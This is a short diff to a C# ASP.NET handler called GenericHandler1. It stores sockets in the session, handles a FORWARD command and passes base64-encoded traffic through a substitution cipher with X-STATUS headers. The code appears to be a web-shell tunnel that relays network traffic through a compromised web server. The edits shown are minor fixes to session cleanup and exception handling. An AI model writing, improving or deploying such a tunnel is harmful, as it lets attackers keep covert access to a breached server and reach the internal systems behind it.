@@ -48,6 +48,7 @@ public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSe
                         s.Close();
                     } catch (Exception ex) {
                     }
+                    context.Session.Remove(mark);
                     context.Response.AddHeader("X-STATUS", "OK");
                 } else if (cmd == "FORWARD") {
                     Socket s = (Socket)context.Session[mark];
@@ -77,9 +78,8 @@ public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSe
                                 context.Response.BinaryWrite(System.Text.Encoding.Default.GetBytes(StrTr(b64, en, de)));
                             }
                             context.Response.AddHeader("X-STATUS", "OK");
-                        } catch (SocketException soex) {
+                        } catch (SocketException ex) {
                             context.Response.AddHeader("X-STATUS", "OK");
-                            return;
                         }
 
                     } catch (Exception ex) {
@@ -100,5 +100,4 @@ public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSe
             return false;
         }
     }
-
 }
